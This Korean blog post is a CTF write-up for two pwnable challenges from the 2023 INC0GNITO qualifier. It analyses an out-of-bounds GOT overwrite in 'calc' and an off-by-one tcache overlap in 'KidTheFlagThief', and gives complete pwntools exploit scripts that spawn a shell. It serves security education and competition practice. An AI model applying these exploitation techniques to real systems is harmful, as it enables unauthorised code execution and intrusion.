---
layout: post
title: "2023 INC0GNITO CTF Qual - Pwnable Write up"
date: 2023-11-25 23:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux, OOB, tcache]
media_subpath: /assets/img/20231125_INCOGNITO_write-up
image: 1.jpg
---

작년 인코그니토 CTF는 개인전이었는데, 이번에는 인코그니토 CTF는 팀전으로 진행됐다.

예선전과 본선전이 따로 있는 것 같은데, 이번 2023 INC0GNITO CTF 예선전에서 Security Factorial 동아리가 1등을 거머쥐었다.

그중에서 내가 풀었던 포너블 2문제(calc, KidTheFlagThief)에 대해 정리하려고 한다.

## **1. calc (5 solves)**

### **[0x01] 요약**

Out of Bound 취약점으로 인해 가능한 GOT Overwrite 익스플로잇 문제

[문제 파일](https://github.com/brwook/binary/raw/main/2023-INC0GNITO-CTF/calc.zip)

### **[0x02] 분석**

```
[*] '/home/brwook/ctf/43_incognito/calc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

계산기 컨셉의 문제이다.

PIE가 걸려 있지 않고, Partial RELRO이기 때문에 바이너리 내에 gadget과 임의 함수를 GOT에 덮어 실행 흐름을 조작할 수 있을 것으로 예상된다.

BSS 영역에 존재하는 `heap` 전역 배열에 값을 `PUSH`하고 `POP`해서 계산기 로직을 구성하였다.

즉, 포인터가 되는 변수가 존재하고, 해당 변수는 바로 `cnt`이다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    ...
    for ( nptr = s; *nptr; ++nptr )
    {
        v4 = *nptr;
        if ( v4 == '/' )
        {
            v11 = POP();
            if ( atoll(nptr + 1) )
            {
                v7 = v11 / atoll(nptr + 1);
                PUSH(v7);
            }
            else
            {
                ++flag;
            }
        }
    ...
}

__int64 POP()
{
  return heap[--cnt];
}

void __fastcall PUSH(__int64 a1)
{
  int v1; // eax

  v1 = cnt++;
  heap[v1] = a1;
}
```

이때, 위 `main` 함수 로직을 보면, 나누기 기호를 입력하고 이후 문자열에 atoll 함수를 적용한 결과가 0이면 `POP` 연산만 이루어진다.

`POP` 연산 자체에는 범위를 검사하는 것이 없기 때문에, `cnt` 변수가 음수가 될 수 있게 된다.

```c
        if ( v4 != '*' )
        {
          if ( v4 != '+' )
            continue;
LABEL_10:
          v5 = atoll(nptr);
          PUSH(v5);
          continue;
        }
```

음수가 된 상태에서, 더하기 연산을 사용하면 임의 값을 `PUSH` 할 수 있게 되고, 여기서 GOT Overwrite를 수행하면 된다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  v13 = __readfsqword(0x28u);
  print_LOGO();
  init_setting();
  while ( 1 )
  {
    flag = 0;
    cnt = 0;
    memset(s, 0, 0x100uLL);
    memset(heap, 0, sizeof(heap));
    putchar('>');
    gets(s);
    if ( !strncmp(s, "exit", 4uLL) )
      return 0;
    v3 = atoll(s);
    ...
  }
}
```

libc base를 얻기 위해, `memset@plt.got`를 `printf@plt`로 덮어서, FSB 취약점을 만들었다. libc leak을 수행한 후엔, `atoll@plt.got`를 `system` 함수로 덮어서 쉘을 얻었다.

### **[0x03] 익스플로잇**

```py
from pwn import *

if args.REMOTE:
    p = remote('localhost', 12008)
    libc = ELF("libc.so.6", False)
else:
    p = process('./calc', aslr=0, env={"LD_PRELOAD":"./libc.so.6"})
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", False)


# 1. memset@got <- printf@plt
payload = b'/'*0x15 + b'=+' + str(0x401100).encode()
p.sendlineafter(b">", payload)

# 2. libc leak
payload = b'%p:'*6
p.sendlineafter(b">", payload)
p.recvuntil(b":")
s = p.recvuntil(b":>", True).split(b':')
libc.address = int(s[3], 16) - 0x21ba70
log.success(f"libc base @ {hex(libc.address)}")

stack = int(s[4], 16)
log.success(f"stack @ {hex(stack)}")

# 3. atoll@got <- system
payload = b'/'*0x14 + b'=+' + str(libc.symbols['system']).encode()
p.sendline(payload)
p.sendline(b'/bin/sh')
p.interactive()
```

`INCO{Wh4t_4_N1C3_W3ath3r_15_Out_0f_!30UNd}`

## **2. KidTheFlagThief (2 solves)**

### **[0x01] 요약**

간단한 파일/디렉토리를 만들고 삭제하는 쉘 컨셉의 문제임. Off by One 취약점으로 인해 tcache chunk overlapping이 가능함.

heap 내에 파일 구조체를 덮어서 AAW/AAR을 트리거하고 스택에서 ROP하는 방식으로 해결하였음.

[문제 파일](https://github.com/brwook/binary/raw/main/2023-INC0GNITO-CTF/KidTheFlagThief.zip)

### **[0x02] 분석**

자체 파일/디렉토리 구조체를 사용했고, 연결리스트를 통해서 가상의 쉘 환경을 구현해냈다.

```
00000000 dir             struc ; (sizeof=0x70, mappedto_8)
00000000 next            dq ?
00000008 name            db 80 dup(?)
00000058 dirFlag         db ?
00000059                 db ? ; undefined
0000005A                 db ? ; undefined
0000005B                 db ? ; undefined
0000005C                 db ? ; undefined
0000005D                 db ? ; undefined
0000005E                 db ? ; undefined
0000005F                 db ? ; undefined
00000060 parentDir       dq ?                    ; offset
00000068 data            dq ?                    ; offset
00000070 dir             ends
00000070
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 data            struc ; (sizeof=0x60, mappedto_9)
00000000 next            dq ?                    ; offset
00000008 field_8         dq ?
00000010 field_10        dq ?
00000018 field_18        dq ?
00000020 field_20        dq ?
00000028 field_28        dq ?
00000030 field_30        dq ?
00000038 field_38        dq ?
00000040 field_40        dq ?
00000048 field_48        dq ?
00000050 field_50        dq ?
00000058 field_58        dq ?
00000060 data            ends
00000060
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 file            struc ; (sizeof=0x78, mappedto_10)
00000000 next            dq ?
00000008 name            db 80 dup(?)
00000058 fileFlag        db ?
00000059                 db ? ; undefined
0000005A                 db ? ; undefined
0000005B                 db ? ; undefined
0000005C                 db ? ; undefined
0000005D                 db ? ; undefined
0000005E                 db ? ; undefined
0000005F                 db ? ; undefined
00000060 dir             dq ?                    ; offset
00000068 raw_data        dq ?                    ; offset
00000070 size            dd ?
00000074 field_74        dd ?
00000078 file            ends
```

분석한 구조체의 내용은 위와 같으나, 제대로 분석한 것은 아닌 것 같다 ㅎㅎ..

```c
void __fastcall editFile(file *a1)
{
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  printf("<%s> size:%u\n(Enter twice to exit)\n", a1->name, a1->size);
  for ( i = 0; a1->size > i; ++i )
  {
    read(0, &a1->raw_data[i], 1uLL);
    if ( a1->raw_data[i] == 10 )
    {
      read(0, &a1->raw_data[++i], 1uLL);
      if ( a1->raw_data[i] == 10 )
        break;
    }
  }
}
```

분석에는 시간이 조금 걸리지만, 문제 내에 존재하는 취약점은 간단하다. 파일의 내용을 수정할 때, 마지막 글자가 개행이면 1-byte 힙 오버플로우가 발생한다는 것이다.

```c
void __fastcall makeFile_(char *a1)
{
    ...
        else
        {
          printf("New File's Size: ");
          __isoc99_scanf("%u", &filesize);
          if ( strlen(filename) > 0x4F )
            filename[79] = 0;
          makeFile(v2, filename, filesize);
        }
    ...
}

void __fastcall makeFile(dir *curDir, __int64 a2, unsigned int a3)
{
  file *v3; // rbx

  v3 = operator new(0x78uLL);
  initializeFile(v3, a2, a3);
  v3->dir = curDir;
  connectList(&curDir->data->next, v3);
}

void __fastcall initializeFile(file *a1, const char *a2, unsigned int a3)
{
  doNothing_1();
  a1->next = 0LL;
  strcpy(a1->name, a2);
  a1->size = a3;
  a1->raw_data = malloc(a3);
  memset(a1->raw_data, 0, a3);
  a1->fileFlag = 0xFE;
}
```

사용자는 임의 크기의 `raw_data` 청크를 할당할 수 있기 때문에, 1-byte 힙 오버플로우를 활용하여 인접한 청크의 `size`를 수정할 수 있다.

제공된 `libc.so.6` 파일을 확인하였을 때, Ubuntu 22.04 버전임을 알 수 있고, 이는 tcache 메모리 할당자를 사용한다.

tcache 특성 상, 인접한 청크와 병합하지도 않기에 size가 임의로 수정되어도 `main_arena`와 별개로 `tcache_perthread_struct`에서 관리되기 때문에 메모리 관련 검사로 에러가 발생할 확률도 없다시피 하다.

다만 `raw_data` 청크는 할당 시 `memset` 함수로 인해 0으로 초기화되기 때문에, 이에 유의하여 힙 청크를 구성해야 한다.

![청크 구성](2.png)

나의 경우엔 이렇게 기존 파일 구조체(C)가 새롭게 할당되는 파일 구조체(B)의 `raw_str`에 의해 초기화되더라도, 로직 상 추가되는 힙 포인터(`next`)를 활용하여 heap leak을 수행하였다.

이후에는 heap 내에 unsorted bin을 할당하여 libc leak을 수행하고, 스택에서 ROP를 하였다.

### **[0x03] 익스플로잇**

```python
from pwn import *
def changeDir(name):
    p.sendlineafter(b"$ ", f"cd {name}".encode())

def makeDir(name):
    p.sendlineafter(b"$ ", f"mkdir {name}".encode())

def makeFile(name, size):
    p.sendlineafter(b"$ ", f"touch {name}".encode())
    p.sendlineafter(b"Size: " , str(size).encode())

def removeFile(name):
    p.sendlineafter(b"$ ", f"rm {name}".encode())

def editFile(name, data):
    p.sendlineafter(b"$ ", f"edit {name}".encode())
    p.sendafter(b")\n", data)

def readFile(name):
    p.sendlineafter(b"$ ", f"cat {name}".encode())

context(arch='amd64', os='linux')
if args.REMOTE:
    p = remote('localhost', 12007)
    libc = ELF("libc.so.6", False)
else:
    p = process("./KidTheFlagThief", aslr=1, env={"LD_PRELOAD":"./libc.so.6"})
    libc = ELF("libc.so.6", False)

makeFile("A", 0x70)
removeFile("A")
makeFile("A", 0x18)
makeFile("B", 0x18)
makeFile("C", 0x108)

# 1. exploit off by one (size 0x20 -> 0xF1)
editFile("A", b'A'*0x17 + b'\n' + p8(0xF1))
removeFile("B")

# 2. chunk overlapping
makeFile("B", 0xE0)
readFile("B")

# 3. heap leak
p.recvuntil(b"\xf0")
heap = u64(b'\xf0' + p.recv(7)) - 0x125f0
root_dir = heap + 0x120c0
A = heap + 0x12570
B = heap + 0x125f0
C = heap + 0x126b0
log.success(f"heap base @ {hex(heap)}")
log.info(f"A @ {hex(A)}")
log.info(f"B @ {hex(B)}")
log.info(f"C @ {hex(C)}")

# 4. libc leak with unsorted bin address
# modify File(C)->raw_str, it makes AAR/AAW
payload = b'\x00'*0x18 + p64(0x81)
payload += p64(B) + b'C'.ljust(0x50, b'\x00')
payload += p64(0xFE)
payload += p64(root_dir) + p64(heap + 0x128c0)
payload += p64(0x8) + p64(0x108) + b'\n\n'
editFile("B", payload)

changeDir("Can")
makeFile("D", 0x500)
makeFile("F", 0x500)
removeFile("D")
removeFile("F")
changeDir("/")
readFile("C")
what = u64(p.recvuntil(b"\x00\x00"))
log.info(f"what @ {hex(what)}")
libc.address = what - 96 - 0x100 - 0xE0 - libc.symbols['_IO_2_1_stdin_']
log.success(f"libc base @ {hex(libc.address)}")

# 5. stack leak with environ global variable
payload = b'\x00'*0x18 + p64(0x81)
payload += p64(B) + b'C'.ljust(0x50, b'\x00')
payload += p64(0xFE)
payload += p64(root_dir) + p64(libc.symbols['environ'])
payload += p64(8) + p64(0x108) + b'\n\n'
editFile("B", payload)
readFile("C")
stack = u64(p.recvuntil(b'\x00\x00')) 
target = stack - 0x140
log.success(f"stack @ {hex(stack)}")
log.info(f"target @ {hex(target)}")

# 6. make ROP in edit_file RET
payload = b'\x00'*0x18 + p64(0x81)
payload += p64(B) + b'C'.ljust(0x50, b'\x00')
payload += p64(0xFE)
payload += p64(root_dir) + p64(target)
payload += p64(0x60) + p64(0x108) + b'\n\n'
editFile("B", payload)

rop = ROP(libc)
rop.call(rop.find_gadget(["ret"]))
rop.call("system", [next(libc.search(b"/bin/sh"))])
editFile("C", rop.chain() + b'\n\n')

p.interactive()
```

`INCO{Kait0-14tdo_14tto-katto_Inc0g-n1to}`